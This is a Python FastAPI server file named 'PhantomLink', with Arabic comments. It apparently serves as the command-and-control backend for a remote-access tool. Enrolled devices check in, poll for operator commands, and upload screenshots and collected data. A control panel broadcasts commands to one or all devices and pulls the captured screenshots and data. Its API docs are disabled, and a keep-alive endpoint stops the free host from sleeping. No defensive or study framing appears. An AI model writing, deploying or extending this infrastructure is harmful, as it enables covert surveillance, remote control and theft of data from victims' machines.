# phantom_server.py | PhantomLink v1.1 | FastAPI | Render Free Tier
# ══════════════════════════════════════════════════════════════════
#  pip install fastapi uvicorn
#  uvicorn phantom_server:app --host 0.0.0.0 --port 10000
# ══════════════════════════════════════════════════════════════════

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import time, threading

app = FastAPI(title="PhantomLink Server", docs_url=None, redoc_url=None)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Config ────────────────────────────────────────────────────────
SECRET         = "phantomlink2025"
DEVICE_TIMEOUT = 30      # ثواني — بعدها الجهاز يُعتبر offline
MAX_DATA_ITEMS = 20      # أقصى عدد data items محفوظة لكل جهاز

# ── In-memory state ───────────────────────────────────────────────
#  devices  → { device_id: { name, ip, version, last_seen } }
#  commands → { device_id: { action, data } }   آخر أمر لكل جهاز
#  screenshots → { device_id: "base64..." }
#  data_store  → { device_id: [ {type, payload, ts}, ... ] }

devices:     dict = {}
commands:    dict = {}
screenshots: dict = {}
data_store:  dict = {}
_lock = threading.Lock()

# ── Auth helper ───────────────────────────────────────────────────
def _auth(secret: str):
    if secret != SECRET:
        raise HTTPException(status_code=403, detail="forbidden")

# ══════════════════════════════════════════════════════════════════
#  Models
# ══════════════════════════════════════════════════════════════════

class HeartbeatBody(BaseModel):
    secret:    str
    device_id: str
    username:  str
    ip:        str
    version:   str

class SendBody(BaseModel):
    secret: str
    action: str
    data:   str = ""
    target: str = "all"     # device_id أو "all"

class ScreenshotBody(BaseModel):
    secret:    str
    device_id: str
    image:     str          # base64

class DataBody(BaseModel):
    secret:    str
    device_id: str
    type:      str
    payload:   str

# ══════════════════════════════════════════════════════════════════
#  Client endpoints  (بيستخدمها phantom_client.py)
# ══════════════════════════════════════════════════════════════════

@app.post("/heartbeat")
def heartbeat(body: HeartbeatBody):
    _auth(body.secret)
    with _lock:
        devices[body.device_id] = {
            "name":      body.username,
            "ip":        body.ip,
            "version":   body.version,
            "last_seen": time.time(),
            "online":    True,
        }
        # جهاز جديد — command افتراضي none
        if body.device_id not in commands:
            commands[body.device_id] = {"action": "none", "data": ""}
    return {"ok": True}


@app.get("/poll")
def poll(secret: str, device_id: str):
    _auth(secret)
    with _lock:
        cmd = commands.get(device_id, {"action": "none", "data": ""})
        # امسح الأمر بعد ما العميل يأخذه
        commands[device_id] = {"action": "none", "data": ""}
    return cmd


@app.post("/screenshot")
def upload_screenshot(body: ScreenshotBody):
    _auth(body.secret)
    with _lock:
        screenshots[body.device_id] = body.image
    return {"ok": True}


@app.post("/data")
def upload_data(body: DataBody):
    _auth(body.secret)
    with _lock:
        bucket = data_store.setdefault(body.device_id, [])
        bucket.append({
            "type":    body.type,
            "payload": body.payload,
            "ts":      time.time(),
        })
        # حافظ على آخر N فقط
        if len(bucket) > MAX_DATA_ITEMS:
            data_store[body.device_id] = bucket[-MAX_DATA_ITEMS:]
    return {"ok": True}

# ══════════════════════════════════════════════════════════════════
#  Control Panel endpoints  (بيستخدمها phantom_control.py)
# ══════════════════════════════════════════════════════════════════

@app.get("/devices")
def list_devices(secret: str):
    _auth(secret)
    now = time.time()
    result = {}
    with _lock:
        for did, info in devices.items():
            result[did] = {
                **info,
                "online": (now - info["last_seen"]) < DEVICE_TIMEOUT,
            }
    return result


@app.post("/send")
def send_command(body: SendBody):
    _auth(body.secret)
    cmd = {"action": body.action, "data": body.data}
    with _lock:
        if body.target == "all":
            for did in devices:
                commands[did] = cmd
        else:
            commands[body.target] = cmd
    return {"ok": True, "target": body.target}


@app.get("/screenshot")
def get_screenshot(secret: str, device_id: str):
    _auth(secret)
    with _lock:
        img = screenshots.get(device_id)
    if not img:
        return {"image": None}
    return {"image": img}


@app.get("/data")
def get_data(secret: str, device_id: str):
    _auth(secret)
    with _lock:
        items = list(data_store.get(device_id, []))
        # امسح بعد ما لوحة التحكم تاخذها
        data_store[device_id] = []
    return {"items": items}


# ── Health check — يمنع Render من النوم ──────────────────────────
@app.get("/ping")
def ping():
    return {"status": "ok", "ts": time.time()}
